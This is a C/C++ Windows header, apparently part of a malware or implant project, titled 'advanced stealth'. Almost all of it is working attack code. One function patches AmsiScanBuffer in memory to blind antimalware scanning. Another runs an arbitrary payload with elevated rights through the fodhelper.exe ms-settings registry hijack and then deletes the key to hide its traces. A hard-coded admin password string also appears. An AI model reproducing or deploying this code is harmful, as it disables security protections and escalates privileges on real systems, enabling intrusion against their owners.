#ifndef ADVANCED_STEALTH_H
#define ADVANCED_STEALTH_H

#include <windows.h>
#include <string>
#include "api_hashes.h"

#define SIMULATED_ADMIN_PASS L"*TIsoporte"

typedef struct _AMSI_API {
    ULONG_PTR NtProtectVirtualMemory;
    ULONG_PTR NtWriteVirtualMemory;
} AMSI_API;

static BOOL BypassAMSI(API_TABLE* api) {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    PVOID baseAddr = pAmsiScanBuffer;

    if (((NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->NtProtectVirtualMemory)(
        GetCurrentProcess(), &baseAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));

        ((NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->NtProtectVirtualMemory)(
            GetCurrentProcess(), &baseAddr, &patchSize, oldProtect, &oldProtect);
        
        return TRUE;
    }

    return FALSE;
}

static BOOL BypassUAC(const wchar_t* payloadPath) {
    HKEY hKey;
    LPCWSTR registryPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER, registryPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)payloadPath, (DWORD)(wcslen(payloadPath) + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
    RegCloseKey(hKey);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExW(&sei)) {
        Sleep(2000);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        return TRUE;
    }

    return FALSE;
}

static BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
    }
    if (hToken) CloseHandle(hToken);
    return isAdmin;
}

#endif
